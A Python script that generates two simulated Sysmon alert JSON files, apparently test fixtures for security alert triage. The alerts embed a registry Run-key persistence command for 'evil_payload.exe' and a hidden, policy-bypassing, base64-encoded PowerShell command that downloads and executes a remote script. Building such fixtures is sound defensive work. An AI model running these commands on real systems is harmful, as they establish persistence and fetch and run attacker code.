import json

alert1 = {
    "alert_id": "SEC-ALERT-2026-001",
    "timestamp": "2026-10-10T07:35:12Z",
    "host": "vm-windows-target",
    "user": "azureuser",
    "event_source": "Microsoft-Windows-Sysmon",
    "event_id": 13,
    "description": "Registry value set in autorun key",
    "details": {
        "image": "C:\\Windows\\System32\\reg.exe",
        "target_object": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
        "details": "C:\\Users\\azureuser\\AppData\\Local\\Temp\\evil_payload.exe",
        "process_id": 4820,
        "parent_image": "C:\\Windows\\System32\\cmd.exe",
        "parent_command_line": "cmd.exe /c reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d C:\\Users\\azureuser\\AppData\\Local\\Temp\\evil_payload.exe /f"
    }
}

alert2 = {
    "alert_id": "SEC-ALERT-2026-002",
    "timestamp": "2026-10-10T07:42:01Z",
    "host": "vm-windows-target",
    "user": "azureuser",
    "event_source": "Microsoft-Windows-Sysmon",
    "event_id": 1,
    "description": "Suspicious base64 encoded PowerShell execution",
    "details": {
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "command_line": "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAA6ADgwADgAMAAvAHMAZQBjAHIAZQB0AC4AcABzADEAJwApAA==",
        "process_id": 6124,
        "parent_image": "C:\\Windows\\explorer.exe",
        "parent_command_line": "C:\\Windows\\explorer.exe"
    }
}

with open("alerts/alert_registry_persistence.json", "w", encoding="utf-8") as f:
    json.dump(alert1, f, indent=2)

with open("alerts/alert_encoded_powershell.json", "w", encoding="utf-8") as f:
    json.dump(alert2, f, indent=2)

print("[SUCCESS] Alert files written properly!")
